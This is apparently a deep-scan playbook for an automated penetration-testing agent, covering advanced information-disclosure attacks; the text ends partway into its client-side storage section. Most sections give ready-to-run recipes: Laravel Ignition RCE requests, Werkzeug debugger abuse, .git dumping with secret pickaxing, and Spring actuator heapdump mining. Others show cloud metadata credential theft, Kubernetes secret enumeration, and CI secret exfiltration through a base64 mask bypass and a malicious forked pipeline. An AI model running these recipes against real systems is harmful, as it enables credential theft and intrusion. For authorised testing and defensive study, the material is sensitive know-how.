---
name: information-disclosure-advanced-deep
description: Advanced information-disclosure primitives — framework debug endpoints, DVCS/sourcemap reconstruction, SSR hydration leaks, cloud IMDS extraction, K8s secret enumeration, CI/CD pipeline leaks, GraphQL introspection, client-side storage, error differentials, observability stack exploitation, serverless runtime metadata, differential oracles, and CDN cache-key disclosure.
sibling: information_disclosure
load_when: scan_mode == "deep"
---

# Information Disclosure — Advanced Techniques

Base `information_disclosure.md` owns the attack-surface framing, the standout `.git`-pickaxe / source-map / actuator `/heapdump` / CVSS-triage content, and the one-line CVE class-shapes with routes to the novel sibling. This file owns the expert-tier primitives: framework-specific debug-endpoint exploitation, full DVCS reconstruction and `.map` recovery pipelines, SSR hydration cross-user leakage, observability-stack (actuator, pprof, JMX, metrics) reaching further than info-disclosure, differential oracles across HTTP/HTTP, and CDN cache-key disclosure. CVE-level version metadata lives in `information_disclosure_novel_deep.md`; this file references by CVE number with pointers.

## Framework Debug-Endpoint Primitives

**Primitive.** Server frameworks ship interactive debuggers, error pages with code-execution affordances, and profiler endpoints that in dev-mode permit arbitrary command execution or source browsing. When these ship enabled to production — a deployment-config mistake, not a vulnerability per se — any unauthenticated client reaches the primitive.

**Preconditions.** All of: (i) the framework's debug mode is enabled in production (DJANGO_DEBUG=True, FLASK_DEBUG=1, RAILS_ENV=development, ASP.NET customErrors Off, Laravel APP_DEBUG=true); (ii) the debug endpoint path is reachable without authentication (default on most frameworks); (iii) specific framework-level mitigations (Werkzeug debugger PIN, Rails `web-console` IP allowlist) have been bypassed or disabled.

**Attack recipes (per framework).**

```bash
# Werkzeug debugger — reach the interactive debugger (any unhandled exception):
curl 'https://target/debug?x=1/0'  # triggers exception; debugger renders stack trace
# Compute the Werkzeug PIN: debugger protects itself with a PIN derived from
# (username, modname, getattr(app, '__name__'), hostname, machine-id, uuid.getnode())
# Any of these leakable from server-side fingerprints bootstraps PIN cracking.
# Public PIN-cracker helpers: werkzeug_pin / exploit scripts replicate the hash.

# Django DEBUG=True — stack trace + settings dump + template probes:
curl 'https://target/does-not-exist'  # 404 renders full URL conf
curl 'https://target/raise-exception'  # 500 renders template with locals + request + settings
# Settings tab dumps every setting including DATABASES password unless it is
# in the configured sensitive-settings filter.

# Laravel Ignition (pre-2.5.2) — RCE via "solution" POST:
curl -X POST 'https://target/_ignition/execute-solution' \
  -H 'Content-Type: application/json' \
  -d '{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
       "parameters":{"viewFile":"phar:///tmp/foo","variableName":"a"}}'
# Vulnerable Ignition versions accepted solution class names that reached deser sinks.

# ASP.NET customErrors Off — stack traces include file paths and configuration;
# combined with /elmah.axd (if present and unauthenticated) exposes error-log history.

# Flask / Werkzeug — the console endpoint:
curl 'https://target/console'  # if routed, interactive Python shell as the app user
```

**Confirmation signal.** The response for an exception-triggering request renders framework-specific debug HTML (Werkzeug's "iframe traceback" + "Interactive debugger"; Django's "Request information" tabs; Laravel's "WHOOPS" or Ignition pages; ASP.NET's "Server Error in '/' Application" with stack trace). Specifically: Werkzeug produces a URL pattern ending in `/__debugger__/` for frame-level eval; Django's debug page includes "Settings" at the bottom; Laravel's Ignition page includes a "Solutions" column with executable solution templates.

**Impact.** Werkzeug PIN cracked → arbitrary Python eval under the app process. Django DEBUG → full configuration leak including DB creds, often sufficient to pivot to the DB directly. Laravel Ignition pre-2.5.2 → RCE via the "solution" deser chain. ASP.NET customErrors → paths-plus-config disclosure, routes to `path_traversal_lfi_rfi.md` for the write-to-webroot chain. Routes to `rce.md § Framework-Debug-to-RCE` for the direct-execution paths.

## DVCS Reconstruction and Secret Pickaxe

**Primitive.** A directory-listing-disabled but object-path-reachable `.git/` (or `.svn`, `.hg`) permits full repository reconstruction because every object's path is deterministic (SHA-1 under `/.git/objects/<first-2>/<rest-38>`), the ref files are text, and the index + HEAD completely describe the working tree. The reconstruction class is reusable across DVCS systems; the pickaxe class (searching history for strings) is where the find-removed-secrets primitive lives.

**Preconditions.** All of: (i) `.git/HEAD` or `.svn/wc.db` or `.hg/dirstate` returns 200; (ii) object paths under `.git/objects/`, `.svn/pristine/`, `.hg/store/data/` are also reachable (verify by requesting a specific object); (iii) `git-dumper` or equivalent runs to completion against the target's object endpoint without rate-limiting the attacker out.

**Attack recipe.**

```bash
# Confirm .git is live:
curl -s https://target/.git/HEAD                      # "ref: refs/heads/main\n"
curl -s https://target/.git/config                    # [core] / [remote "origin"] stanza

# Full dump:
git-dumper https://target/.git/ ./loot
cd loot
git log --all --oneline                               # verify checkout succeeded

# Secret pickaxe across history — the removed-but-cached secret pattern:
git log -p --all -S 'AKIA'                            # AWS access keys ever committed
git log -p --all -S 'BEGIN RSA PRIVATE KEY'           # RSA keys
git log -p --all -S 'ghp_'                            # GitHub PAT prefix (classic)
git log -p --all -S 'github_pat_'                     # GitHub PAT prefix (fine-grained)
git log -p --all -S 'xoxb-'                           # Slack bot token
git log -p --all -S 'xoxp-'                           # Slack user token

# gitleaks: full-corpus scan of recovered repo:
gitleaks detect --source . --report-format json --report-path leaks.json
# Each hit includes commit hash, file path, line, and the detector name.
```

For `.svn`: use `svn-extractor` or craft requests against `/.svn/pristine/<first-2>/<rest-38>.svn-base`. For `.hg`: traverse `/.hg/store/data/` and each tracked file has a corresponding `*.i` and `*.d` object. For `.DS_Store`: each file is a BTree that names sibling entries; recursive crawl with `ds_store_exp` maps otherwise-unlinked files.

**Confirmation signal.** The dumped working tree matches the deployed application's source (compare rendered HTML templates with the recovered template files; compare JS bundles with the recovered pre-minification sources). The pickaxe output shows at least one secret-shaped string in history that is not present in the current HEAD — the "removed but still committed" class. Follow-up: test the removed secret against the current deployment (if the key is still active, that is the finding).

**Impact.** Full source-code disclosure (including comments, developer notes, and TODOs that often name internal services); removed-secret recovery converts a "we deleted that credential" claim into live-credential exfiltration; the recovered source reveals the exploit surface for every other class (template-injection sinks, deser points, upload paths). Routes to `rce.md` for the recovered-source-reveals-sink class and to every other vulnerability class for the mapping.

## Source-Map Reconstruction and Bundle Pickaxe

**Primitive.** A JS bundle served alongside a `.map` file (either referenced via `//# sourceMappingURL=` or served at the predictable `<bundle>.map` path) permits full reconstruction of the pre-minification sources, including comments, inlined constants (API endpoints, feature flags, embedded test credentials), and the module tree. The reconstructed sources often contain substantially more intelligence than the deployed bundle because tree-shaking and minification remove developer-oriented strings that the `.map` restores.

**Preconditions.** All of: (i) the bundle is minified (map-reconstruction value drops to nil on a non-minified bundle); (ii) the `.map` file is served to anonymous clients — often enabled by default in dev pipelines and left on in production; (iii) the map references real source paths rather than webpack-chunk pseudo-paths (the `sourcesContent` field in the map contains the full pre-minification sources inline, so the paths matter less).

**Attack recipe.**

```bash
# Discover bundles via headless crawler, then probe for .map alongside each:
katana -u https://target -d 2 -jc -silent | grep -Eo 'https?://\S+\.js$' | sort -u > js.txt
while read u; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "${u}.map")
  [ "$code" = "200" ] && echo "map-live: ${u}.map"
done < js.txt > maps.txt

# Reconstruct the source tree:
npx unwebpack-sourcemap -o ./src-out https://target/assets/app.<hash>.js.map

# Pickaxe the recovered tree for intel:
rg -n -i 'api[_-]?key|secret|token|internal\.|localhost|/api/[a-z_-]+' ./src-out
rg -n -i 'TODO|HACK|FIXME|XXX' ./src-out                  # developer notes
rg -n '"private":\s*true' ./src-out                       # private package markers
jq -r '.sources | .[]' app.<hash>.js.map                 # list every source file name
```

For maps served under `.pack` or Vite's compressed-map format, use `source-map-explorer` or `webpack-source-map-explorer` for interactive bundle+source traversal. Build-tool specifics vary (Vite, esbuild, Rollup, Turbopack) but every tool's map file is standards-compliant Source Map v3 and the recovery pipeline is identical.

**Confirmation signal.** The reconstructed sources include at least one of: a comment with an internal URL, hostname, or path; a hardcoded test credential (common in E2E test blocks accidentally bundled); an internal API endpoint path not referenced by the deployed site's visible routes; a developer email or Jira ticket reference. The map's `sourcesContent` array contains the actual source bytes, which can be dumped and inspected without executing anything.

**Impact.** Internal API endpoint disclosure drives the IDOR/BFLA/auth-bypass hunts (route to `broken_function_level_authorization.md` and `idor.md`); hardcoded credentials convert directly to API access; developer notes leak the architecture that defenders assumed was obscure. Routes to every other vulnerability class because the recovered sources name the sinks.

## SSR Hydration Cross-User Leak

**Primitive.** Server-rendered frameworks (Next.js, Nuxt, SvelteKit, Remix, Angular Universal) serialize the data used to render the page into a `<script>` block in the HTML (`__NEXT_DATA__`, `__NUXT__`, `__sveltekit`, `window.__remixContext`, Angular's state-islands JSON). The serialized state frequently contains more than the DOM renders — full user objects, cross-tenant records fetched during SSR, feature flags, internal IDs — because the developer dumped the full API response into the state tree and the component only rendered specific fields. A page rendered for User A can accidentally include User B's data when SSR reused a cached response, or include internal-admin data when SSR fetched more than the role required.

**Preconditions.** All of: (i) the application uses SSR (identified by the hydration-blob tag or by `<meta name="next-head-count">` / `<meta name="nuxt-ssr-rendered">` markers); (ii) the SSR fetch is authenticated and the fetched response includes fields beyond those the component renders; (iii) the SSR response is cacheable at a layer (CDN, framework-level `revalidate`, in-memory LRU) OR the page is rendered on-demand per-request but with fields the role should not see.

**Attack recipe.**

```bash
# Dump __NEXT_DATA__ and compare the fields in props vs the DOM:
curl -s -H "Cookie: session=<role-A>" 'https://target/dashboard' | \
  python3 -c '
import re, sys, json
m = re.search(r"<script id=\"__NEXT_DATA__\" type=\"application/json\">(.*?)</script>", sys.stdin.read(), re.S)
data = json.loads(m.group(1))
print(json.dumps(data["props"], indent=2))
' > role-a-props.json

# Compare across roles:
# Repeat for role B, then diff the recovered props blobs for cross-role data:
diff role-a-props.json role-b-props.json

# Also inspect Next.js App Router RSC flight payloads:
curl -s 'https://target/dashboard' | grep -oP 'self\.__next_f\.push\(\[.*?\]\)' | head
# These streaming payloads carry Server Component data that the DOM may not render.
```

Verify the fields in the hydration blob against the rendered HTML. A field present in the blob but absent from the DOM is a disclosure if the field would be access-controlled when fetched directly through the API.

**Confirmation signal.** The hydration blob contains fields that the rendered page does not display, AND those fields would require elevated privilege or a different user context to fetch via the API. Cross-role diff shows role A's blob contains role B's data under at least one key, OR the blob contains fields the API's documented response schema does not expose to the current role.

**Impact.** Cross-tenant data disclosure through SSR — a `/dashboard` request renders User A's view but ships User B's record in the hydration state because the SSR cache keyed on page URL rather than user identity. The class generalizes: anywhere SSR serializes authenticated API responses into HTML, the resulting payload is as sensitive as the API response and must be scoped to the viewing user. Routes to `idor.md` for the role-vs-record disclosure framing and to `csrf.md` for the chained write-after-disclosure path.

## Observability Endpoint Primitives

**Primitive.** Metrics, tracing, and profiling endpoints (Prometheus `/metrics`, Go `/debug/pprof`, Java `/actuator`, JMX via Jolokia, Jaeger/Zipkin/Kibana UIs) expose internal structure that spans info-disclosure, SSRF, and (for `/actuator/gateway` and `/actuator/jolokia`) RCE. The class spans fourteen common endpoints; this section catalogs the per-endpoint primitive, with the full version-boundary CVE metadata routed to `information_disclosure_novel_deep.md`.

**Preconditions.** All of: (i) the specific endpoint is reachable without authentication (common on `/metrics` — exposed to Prometheus scraping is "every network" by default); (ii) the response reveals internal structure beyond the service's public surface; (iii) for the chaining primitives (actuator SpEL, Jolokia MBean loading), the specific vulnerable version and configuration apply (see novel sibling).

**Attack recipes (per endpoint).**

```bash
# Prometheus /metrics:
curl 'https://target/metrics'
# Reveals: process args (process_cmdline), build info (build_info with version/commit),
# JVM metrics with heap size, DB connection pool stats, custom metrics with tenant IDs.

# Go pprof:
curl 'https://target/debug/pprof/'
# Enumerate: heap, goroutine, cmdline, allocs, mutex, block, trace.
# The /debug/pprof/cmdline endpoint reveals the full binary invocation.
curl 'https://target/debug/pprof/goroutine?debug=2'  # all stack traces, incl. secrets in closures

# Spring Boot /actuator deep walk:
curl 'https://target/actuator'                                      # endpoint index
curl 'https://target/actuator/env'                                  # config + property names (values masked)
curl 'https://target/actuator/heapdump' -o heap.hprof               # full JVM heap
strings heap.hprof | grep -Ei '(password|secret|aws_access|jdbc:)'  # pickaxe
curl 'https://target/actuator/loggers'                              # logger config
curl 'https://target/actuator/threaddump'                           # thread stacks + locals
curl 'https://target/actuator/mappings'                             # every controller path
curl 'https://target/actuator/beans'                                # bean DI graph
curl 'https://target/actuator/configprops'                          # @ConfigurationProperties binding

# Jolokia (JMX over HTTP):
curl 'https://target/jolokia/list'                                  # MBean inventory
# Specific MBeans: ch.qos.logback.classic for logback remote-config load,
# java.lang:type=Memory for GC + heap, org.apache.catalina.* for Tomcat internals.

# Jaeger / Zipkin UIs (if unauthenticated):
curl 'https://target/api/traces?service=<svc>&limit=20'
# Trace content includes DB query bodies, upstream service names, request headers.

# Grafana Datasource proxy (unauth or weak-auth):
curl 'https://target/api/datasources'                               # datasource inventory incl. type/URL
# The datasource proxy is itself SSRF (route to ssrf.md); the inventory enumerates targets.
```

**Confirmation signal.** The endpoint responds with structured data (JSON, Protobuf, Prometheus exposition) that contains internal names, versions, and metrics. Specifically: `/metrics` returns `build_info{version="<ver>",commit="<sha>"}` naming the deployed version; `/pprof/cmdline` returns the binary path and argv including flags; `/actuator/heapdump` returns a `.hprof` binary with the Java magic bytes `JAVA PROFILE 1.0.2`; `/jolokia/list` returns `{"request":{"type":"list"},"value":{...}}` with MBean names.

**Impact.** Direct credential disclosure from `/actuator/heapdump` and `/pprof/goroutine?debug=2`; version-fingerprinting for CVE mapping; service-topology mapping for internal-network lateral movement; and the SSRF chain through Grafana datasource proxy or actuator gateway. Routes to the novel sibling for CVE-specific exploitation (CVE-2025-48927 TeleMessage, CVE-2022-22947 Spring Cloud Gateway) and to `ssrf.md` for the datasource-proxy chain.

## HTTP Differential Oracle Primitives

**Primitive.** Even without a disclosed body, HTTP responses carry oracle bits — status code, response length, ETag, Last-Modified, Cache-Control, Accept-Ranges, Server-Timing — that leak existence, ownership, and even content byte-count. A diff harness that normalizes on these fields across (owner / non-owner / anonymous) × (HEAD / GET / Range) tabulates where the application fails to equalize responses across identity boundaries.

**Preconditions.** All of: (i) the target has resources whose existence or state is intended to be private; (ii) at least one response field varies between owner and non-owner access without explicit auth-dependent processing (the typical bug is "we return 403 for forbidden and 404 for not-found" or "we return 200 with empty body for owner and 200 with error body for non-owner" — both carry oracle bits).

**Attack recipe.**

```bash
# Baseline response for anonymous access:
curl -s -o /dev/null -w '%{http_code} %{size_download} %{header_etag} %{header_last_modified}\n' \
  'https://target/resource/known-exists-public'

# Diff for a presumed-private resource across identities:
for cookie in '' 'session=user-a' 'session=user-b'; do
  curl -s -o /dev/null -w '%{http_code} %{size_download}\n' -H "Cookie: $cookie" \
    'https://target/resource/suspected-private'
done
# A length diff where the identity differs is a disclosure oracle for existence/ownership.

# HEAD vs GET — many frameworks process HEAD identically to GET, revealing size without body:
curl -I 'https://target/resource/x'  # Content-Length reveals size without GET
# A long private-doc 200 HEAD + 403 GET pair confirms the doc exists and its length.

# Conditional requests — 304 vs 200 as existence oracle:
curl -s -o /dev/null -w '%{http_code}\n' -H 'If-None-Match: "known-etag"' 'https://target/resource/x'
# 304 → the known ETag matches, resource exists and is identical to our cached copy.
# 200 → either the resource is different or doesn't exist (follow-up GET distinguishes).

# Timing oracles — authenticated resource existence by response time:
hyperfine 'curl -s -o /dev/null https://target/resource/exists-private' \
          'curl -s -o /dev/null https://target/resource/does-not-exist'
# Consistent timing diff → existence oracle via time, often more reliable than status.
```

**Confirmation signal.** The diff harness reveals a reproducible asymmetry across identities on a response field — different status codes, different lengths (`Content-Length` or body-size), different ETag values, different timing. The asymmetry is reproducible across repeated samples and is not a transient network effect.

**Impact.** User-enumeration (sign-up form with "email already registered"), tenant-enumeration (cross-tenant resource IDs leaking existence), existence-of-sensitive-record disclosure (private file / message / audit log). Routes to `idor.md` for the resource-ID enumeration chain and to `broken_function_level_authorization.md` for the endpoint-visibility enumeration.

## CDN and Cache Key Disclosure

**Primitive.** CDNs and reverse-proxies cache responses keyed on a specific subset of the request (`Host`, `URL`, headers listed in `Vary`). A cache that keys on URL alone (missing `Authorization` from `Vary`) serves authenticated-content responses to anonymous clients once a victim populates the cache; a cache that keys on `Vary: User-Agent` for authenticated content serves the same payload to any client matching the UA, which is often trivial to replicate.

**Preconditions.** All of: (i) the application routes authenticated responses through a cache; (ii) the cache's `Vary` header is absent, incomplete, or restricted to fields the attacker can match; (iii) a legitimate user has recently populated the cache for the target URL (or the attacker can wait for a user to do so).

**Attack recipe.**

```bash
# Baseline — populate the cache with an authenticated response:
curl -H 'Cookie: session=victim' 'https://target/account/me'

# Anonymous retrieval — if the cache keys only on URL, the victim's response leaks:
curl 'https://target/account/me' | tee anonymous-attempt.json
# If anonymous-attempt.json contains victim-specific data (name, email, balance),
# the cache was identity-unaware.

# Vary bypass — replicate the fields the cache keys on:
# Discover Vary values from Cache-Control / Vary headers:
curl -I -H 'Cookie: session=victim' 'https://target/account/me'
# Vary: User-Agent, Accept-Encoding
# Replicate UA from victim's visible UA and request anonymously:
curl -A 'Mozilla/5.0 ...' 'https://target/account/me'

# 206 Range + stale cache — partial-content leak:
curl -H 'Range: bytes=0-99' 'https://target/private-doc'
# A cache that stores the full response and serves ranges from it leaks arbitrary byte ranges.
```

For CDN-specific cache debugging, the `X-Cache` / `Age` / `CF-Cache-Status` / `X-Served-By` / `X-Cache-Hits` headers reveal whether the response was served from cache; a HIT without the attacker's own prior request confirms the cache was populated by another user.

**Confirmation signal.** The anonymous response contains data that should require authentication; `X-Cache: HIT` or `Age: <nonzero>` confirms the response was cached; the response's content matches a prior authenticated response (verify by capturing the authenticated response first and byte-diffing).

**Impact.** Mass authenticated-content disclosure through cache-key gaps — a single victim request populates the cache, then every anonymous retrieval leaks the authenticated response until TTL expiration. Routes to `http_request_smuggling.md § Cache Poisoning` for the key-injection chain and to `csrf.md § Cache-Timing Side Channels` for the write-side correlation.

## Cloud Metadata Service (IMDS) Information Extraction

**Primitive.** Cloud IMDS endpoints (`169.254.169.254` on AWS/GCP/Azure, `169.254.170.2` on ECS, `fd00:ec2::254` on IPv6-enabled EC2) return instance metadata, IAM credentials, user-data scripts, and network configuration to any process on the instance. When an attacker reaches IMDS — via SSRF (owned by `ssrf.md`), container escape, or code execution — the information-disclosure exploitation chain begins: enumerate the metadata tree, extract temporary IAM credentials, discover the instance's role and attached policies, and map the cloud environment's topology. This section owns the *post-reach info-disc extraction* — what to pull and how to interpret it once IMDS is reachable.

**Preconditions.** All of: (i) the attacker has a request path that reaches 169.254.169.254 (SSRF, code execution, container with host-network, or a policy-engine side effect like Kyverno CVE-2026-4789); (ii) IMDSv2 is either not enforced (IMDSv1 is default on older instances) or the attacker can obtain the `X-aws-ec2-metadata-token` via a PUT to the token endpoint (requires the hop limit to be ≥2, which is the case from containers); (iii) the instance profile / managed identity / service account carries a non-trivial IAM role.

**Attack recipes.**

```bash
# AWS IMDSv1 — no token required:
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns role name; then:
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
# Returns AccessKeyId, SecretAccessKey, Token (temporary STS creds)

# AWS IMDSv2 — token required:
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

# GCP — requires Metadata-Flavor header:
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
# Returns OAuth2 access_token for the instance's service account

# Azure — requires Metadata: true header:
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# Returns access_token for the managed identity

# User-data (often contains bootstrap scripts with hardcoded secrets):
curl -s http://169.254.169.254/latest/user-data
# Cloud-init scripts, startup scripts with DB passwords, API keys, join tokens
```

**High-value metadata paths (AWS):**
- `/latest/meta-data/iam/security-credentials/<role>` — temporary IAM credentials
- `/latest/user-data` — cloud-init scripts (frequently contain secrets)
- `/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance` — instance identity document
- `/latest/meta-data/network/interfaces/macs/<mac>/vpc-id` — VPC topology
- `/latest/meta-data/network/interfaces/macs/<mac>/subnet-id` — subnet mapping
- `/latest/meta-data/placement/availability-zone` — region/AZ for lateral movement scoping
- `/latest/dynamic/instance-identity/document` — instance type, account ID, image ID

**Confirmation signal.** The IMDS response returns JSON with `AccessKeyId` starting with `ASIA` (temporary) or `AKIA` (long-lived); GCP returns a JSON with `access_token` and `token_type: Bearer`; Azure returns a JSON with `access_token` and `expires_on`. The `user-data` endpoint returns the verbatim cloud-init / startup script content, which `grep` mines for hardcoded secrets.

**Impact.** Cloud IAM credential disclosure from a single HTTP request; the credentials carry the instance role's full policy set, which typically includes S3/GCS read, EC2/Compute describe, and often write capabilities. User-data scripts leak bootstrap secrets (DB passwords, cluster join tokens, license keys). Network metadata maps the VPC topology for lateral movement. Routes to `ssrf.md` for the SSRF mechanism that reaches IMDS; routes to `cloud/*` for per-provider post-exploitation with the recovered credentials.

## Kubernetes Secrets, ConfigMaps, and RBAC Enumeration

**Primitive.** Kubernetes workloads access secrets through three channels: mounted secret volumes (`/var/run/secrets/`), environment variables injected from `Secret` resources, and the Kubernetes API via the pod's service-account token. Each channel leaks differently: mounted volumes are readable from the filesystem, environment variables are visible in `/proc/self/environ` and crash dumps, and the API token enables cluster-wide enumeration when the service account has excessive RBAC grants. ConfigMaps, while not nominally secret, frequently contain database connection strings, internal service URLs, feature flags, and OAuth client configurations.

**Preconditions.** All of: (i) the attacker has code execution or file-read access on a Kubernetes pod (via RCE, SSRF with file:// protocol, container escape, or a debug endpoint); (ii) the pod mounts secrets or has environment-injected secrets; (iii) the pod's service-account token carries non-default RBAC permissions (many deployments grant `cluster-reader` or broader roles).

**Attack recipes.**

```bash
# Service-account token (always mounted unless automountServiceAccountToken: false):
cat /var/run/secrets/kubernetes.io/serviceaccount/token
SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
KUBE_API="https://kubernetes.default.svc"

# Enumerate what the service account can do:
curl -sk -H "Authorization: Bearer $SA_TOKEN" \
  "$KUBE_API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' \
  -H "Content-Type: application/json"

# List secrets in the current namespace:
curl -sk -H "Authorization: Bearer $SA_TOKEN" \
  "$KUBE_API/api/v1/namespaces/$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)/secrets"

# List ConfigMaps (often contain connection strings):
curl -sk -H "Authorization: Bearer $SA_TOKEN" \
  "$KUBE_API/api/v1/namespaces/default/configmaps"

# Read a specific secret:
curl -sk -H "Authorization: Bearer $SA_TOKEN" \
  "$KUBE_API/api/v1/namespaces/default/secrets/db-credentials" | \
  jq -r '.data | to_entries[] | "\(.key): \(.value | @base64d)"'

# Environment-variable secrets (from /proc):
cat /proc/self/environ | tr '\0' '\n' | grep -iE 'password|secret|key|token|api'

# Mounted secret volumes (common paths):
find /var/run/secrets /etc/secrets /mnt/secrets -type f 2>/dev/null | \
  while read f; do echo "=== $f ==="; cat "$f"; done

# Cross-namespace enumeration (if RBAC allows):
curl -sk -H "Authorization: Bearer $SA_TOKEN" \
  "$KUBE_API/api/v1/secrets" | jq '.items[].metadata | "\(.namespace)/\(.name)"'
```

**Confirmation signal.** The Kubernetes API returns `200 OK` with a JSON response containing `items[]` with secret data (base64-encoded values in `.data`); environment variables contain credential-shaped strings; mounted files contain plaintext secrets. The `SelfSubjectRulesReview` response shows the full RBAC permission set.

**Impact.** Credential disclosure from mounted secrets and environment variables; cluster-wide secret enumeration when the service account has excessive RBAC; ConfigMap content reveals internal service topology, database endpoints, and feature-flag state. Routes to `broken_function_level_authorization.md` for the RBAC-escalation angle and to `cloud/*` for the cloud-credential pivot when secrets contain cloud IAM keys.

## CI/CD Pipeline Information Leakage

**Primitive.** CI/CD systems (GitHub Actions, GitLab CI, Jenkins, CircleCI, Buildkite) process builds in environments where secrets are injected as environment variables, and build logs capture command output that may include those secrets. The leakage surface spans: build logs that echo secrets, artifact stores that retain sensitive outputs, workflow definitions that expose secret names, debug/re-run modes that dump the full environment, and cache poisoning that exfiltrates secrets through build-step side effects.

**Preconditions.** All of: (i) the CI/CD system's build logs or artifacts are accessible to the attacker (public repos on GitHub Actions have public logs; private repos require at minimum read access; Jenkins often has anonymous read on builds); (ii) the build process handles secrets (nearly universal); (iii) the secret-masking mechanism is incomplete or bypassable.

**Attack recipes.**

```bash
# GitHub Actions — secret masking bypass via base64 or character splitting:
# In a workflow step that an attacker controls (e.g., PR-triggered CI on a fork):
echo "${{ secrets.API_KEY }}" | base64
# GitHub Actions masks the literal secret value but not its base64 encoding.
# The base64 appears in the log unmasked → decode to recover the secret.

# GitHub Actions — debug re-run dumps all env vars:
# A user with write access can re-run a workflow with debug logging enabled,
# which prints every step's environment including secrets that the step consumes.
gh run rerun <run-id> --debug

# Jenkins — build logs accessible via API:
curl -s 'https://jenkins.target/job/<name>/lastBuild/consoleText'
# Jenkins does not mask secrets by default; any echo/printenv in a build step
# writes secrets to the log. The Credentials Binding plugin masks but only
# if the secret value is longer than 4 characters.

# GitLab CI — variable exposure via artifact or cache:
# A malicious .gitlab-ci.yml in a forked MR can exfiltrate protected variables:
# script: |
#   env | base64 > /builds/output/env.b64
# artifacts:
#   paths: [output/]
# The artifact is downloadable from the pipeline UI.

# Artifact store enumeration:
gh api repos/<owner>/<repo>/actions/artifacts --paginate | \
  jq '.artifacts[] | "\(.name) \(.size_in_bytes) \(.created_at)"'
# Download and inspect artifacts for leaked secrets, configs, or build outputs:
gh run download <run-id> -D ./artifacts
grep -rn 'password\|secret\|token\|AKIA' ./artifacts/
```

**Confirmation signal.** Build logs contain credential-shaped strings not masked by the CI system's masking (identifiable by regex for `AKIA`, `ghp_`, `glpat-`, `xoxb-`, base64-encoded values that decode to known secret formats). Artifacts contain files with credentials, environment dumps, or configuration not intended for public consumption. Debug re-run logs contain the full environment variable set including injected secrets.

**Impact.** Secret exfiltration from CI/CD logs and artifacts; the recovered credentials often carry deployment-level privileges (cloud IAM, container registry push, production database access). Routes to `supply_chain_ci_integrity.md` for the CI/CD integrity angle and to `cloud/*` for the cloud-credential pivot.

## GraphQL Introspection and Field-Suggestion Enumeration

**Primitive.** GraphQL endpoints that leave introspection enabled expose the complete schema — every type, field, argument, enum value, and relationship in the API. Even with introspection disabled, many implementations leak field names through suggestion mechanisms in error messages ("Did you mean `adminEmail`?"). The disclosed schema reveals internal fields, deprecated-but-still-functional mutations, and hidden admin operations that the UI does not surface.

**Preconditions.** All of: (i) the GraphQL endpoint is reachable; (ii) introspection is enabled (default on most frameworks until explicitly disabled) OR the implementation returns field suggestions in errors; (iii) the schema contains fields or operations beyond what the application's UI exposes.

**Attack recipes.**

```bash
# Full introspection query — extracts the complete schema:
curl -s -X POST 'https://target/graphql' \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind ofType { name kind } } args { name type { name } } } } } }"}' \
  | jq '.data.__schema.types[] | select(.kind == "OBJECT") | {name, fields: [.fields[].name]}'

# Field enumeration via suggestions (when introspection is disabled):
# Send a query with a deliberately wrong field name:
curl -s -X POST 'https://target/graphql' \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ user { passwor } }"}' | jq '.errors[].message'
# Response: "Cannot query field 'passwor' on type 'User'. Did you mean 'password', 'passwordHash'?"
# The suggestion reveals real field names not visible in the UI.

# Automated field brute-force with clairvoyance (introspection-disabled bypass):
# clairvoyance -u https://target/graphql -w /usr/share/wordlists/graphql-fields.txt -o schema.json
# Reconstructs the schema from error-message suggestions without introspection.

# Extract hidden mutations (admin operations the UI doesn't expose):
curl -s -X POST 'https://target/graphql' \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { mutationType { fields { name args { name type { name } } } } } }"}' \
  | jq '.data.__schema.mutationType.fields[] | {name, args: [.args[].name]}'
# Look for: deleteUser, setRole, updatePermissions, createApiKey, exportData

# Altair/GraphiQL IDE exposure:
curl -s 'https://target/graphiql' -o /dev/null -w '%{http_code}'
curl -s 'https://target/altair' -o /dev/null -w '%{http_code}'
# These interactive IDEs often run unauthenticated and provide auto-complete
# against the full schema — they are introspection-equivalent.
```

**Confirmation signal.** The introspection response returns the full `__schema` object with type definitions; the field-suggestion error message names fields the UI does not expose; the Altair/GraphiQL endpoint responds with an interactive IDE HTML page. Specifically: any type with fields like `passwordHash`, `internalId`, `deletedAt`, `adminNotes`, or mutation names like `__debug`, `_dangerouslySetRole` confirms hidden schema surface.

**Impact.** Full API schema disclosure enables targeted IDOR/BFLA hunts (hidden fields reveal per-record data the UI withholds; hidden mutations reveal admin operations the UI doesn't surface). Routes to `idor.md` for the resource-ID exploitation, to `broken_function_level_authorization.md` for the hidden-mutation access, and to `sql_injection.md` for the GraphQL-to-SQL injection surface via arguments.

## Client-Side Storage and State Leakage

**Primitive.** Browser-accessible storage mechanisms — `localStorage`, `sessionStorage`, `IndexedDB`, cookies without `HttpOnly`, and `window.__` global state — frequently contain tokens, user data, feature flags, and internal configuration that the application stores client-side for performance. An XSS vulnerability reads this storage directly; without XSS, the storage is observable through browser DevTools, shared-device scenarios, browser extensions, and JavaScript-accessible diagnostic endpoints that dump client state.

